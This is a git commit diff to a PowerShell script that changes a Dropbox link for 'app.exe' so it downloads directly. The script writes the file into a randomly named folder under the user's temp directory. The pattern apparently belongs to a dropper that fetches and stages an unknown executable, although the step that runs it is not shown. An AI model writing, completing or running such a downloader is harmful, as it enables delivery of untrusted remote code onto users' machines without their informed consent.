783399688c6183d1a7050b9e43ddb13d4d11a94e
Darkriser0207 <teamvitapupdates@gmail.com>
2025-04-17 00:38:42 +0530

    Update ps_script.ps1

--- ps_script.ps1
+++ ps_script.ps1
@@ -1,4 +1,4 @@
-$url = "https://www.dropbox.com/scl/fi/ffhayfxoponlb0j7r0590/app.exe?rlkey=647ndk2z1vad36x2z5cuf27bc&st=hwj1rifa&dl=0"  
+$url = "https://www.dropbox.com/scl/fi/ffhayfxoponlb0j7r0590/app.exe?rlkey=647ndk2z1vad36x2z5cuf27bc&st=hwj1rifa&dl=1"  
 $tempdir = "$env:TEMP\$(New-Guid)" 
 mkdir $tempdir | Out-Null
 $file = "$tempdir\app.exe" 
